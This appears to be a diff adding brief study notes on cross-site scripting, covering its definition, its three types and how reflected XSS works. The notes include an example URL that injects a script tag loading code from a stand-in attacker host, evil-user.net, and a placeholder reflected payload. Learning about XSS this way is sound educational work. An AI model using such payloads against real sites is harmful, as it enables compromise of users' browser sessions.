@@ -1,0 +1,31 @@
+=> What is cross-site scripting (XSS)?
+XSS is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy,
+which is designed to segregate different websites from each other.
+
+=> How does XSS work?
+XSS works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code execute inside a victim's browser, the attacker can compromise their interaction
+with the application. 
+
+Example: https://insecure-website.com/comment?message=<script src=https://evil-user.net/badscript.js></script>
+
+=> XSS Proof of concept
+alert()
+print()
+
+=> Types of XSS attacks?
+
+1: Reflected XSS
+2: Stored XSS
+3: DOM-based XSS
+
+-> Reflected XSS: is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an
+unsafe way.
+
+--------------------####------------------------------------
+https://insecure-website.com/status?message=All+is+well.
+<p>status: all is well.</p> 
+
+The applicationi doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:
+
+https://insecure-website.com/status?message=<script>/*+bad+stuff+here...+*/</script>
+<p>status: <script>/* bad stuff here--*/</script></p>
